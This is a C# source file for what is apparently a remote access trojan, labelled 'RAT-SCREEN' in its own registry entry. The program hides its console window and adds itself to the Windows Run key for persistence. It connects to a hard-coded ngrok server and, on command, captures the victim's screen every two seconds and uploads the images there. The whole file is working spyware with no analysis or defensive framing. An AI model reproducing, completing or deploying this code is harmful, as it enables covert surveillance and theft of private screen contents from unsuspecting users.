using Microsoft.Win32;
using SocketIOClient;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace client
{
	public class Program
	{
		private static SocketIOClient.SocketIO _client;
		private static bool _isScreenshootSending = false;
		private static void Main()
		{
			var handle = GetConsoleWindow();

			// Hide
			ShowWindow(handle, SW_HIDE);
			SetStartup();

			Connect();

			_client.On("screenshoot-sending", (data) =>
			{
				_isScreenshootSending = data.GetValue<bool>();
				ScreenshotExecutor();
			});

			Console.ReadLine();
		}

		private static void SetStartup()
		{
			RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			key.SetValue("RAT-SCREEN", Application.ExecutablePath);
		}

		[DllImport("kernel32.dll")]
		static extern IntPtr GetConsoleWindow();

		[DllImport("user32.dll")]
		static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		const int SW_HIDE = 0;
		const int SW_SHOW = 5;

		private static async void ScreenshotExecutor()
		{
			if (_isScreenshootSending == false) return;

			while (_isScreenshootSending)
			{
				await Task.Delay(TimeSpan.FromSeconds(2));
				SendScreen();
			}
		}

		private static void SendScreen()
		{
			var (name, screen) = CreateScreenshot();
			var bytes = ConvertJPEGToBytes(screen);

			Send("screenshoot", bytes, name);
		}

		private static void Send(string eventName, object bytes, object name)
		{
			_client.EmitAsync(eventName, bytes, name);
		}

		private static (string, Bitmap) CreateScreenshot()
		{
			var date = DateTime.Now;

			int screenWidth = SystemInformation.VirtualScreen.Width;
			int screenHeight = SystemInformation.VirtualScreen.Height;

			Bitmap captureBitmap = new Bitmap(screenWidth, screenHeight, PixelFormat.Format32bppArgb);

			Rectangle captureRectangle = Screen.AllScreens[0].Bounds;

			Graphics captureGraphics = Graphics.FromImage(captureBitmap);

			captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);

			var name = $"Screen_{date.Day}_{date.Month}_{date.Year}_{date.Hour}_{date.Minute}_{date.Second}";

			return (name, captureBitmap);
		}

		private static byte[] ConvertJPEGToBytes(Bitmap screen)
		{
			MemoryStream ms = new MemoryStream();

			screen.Save(ms, ImageFormat.Jpeg);

			byte[] bmpBytes = ms.GetBuffer();

			screen.Dispose();
			ms.Close();

			return bmpBytes;
		}

		private static void Connect()
		{
			_client = new SocketIO("http://93dc-37-21-183-75.eu.ngrok.io");

			_client.ConnectAsync();
		}
	}
}
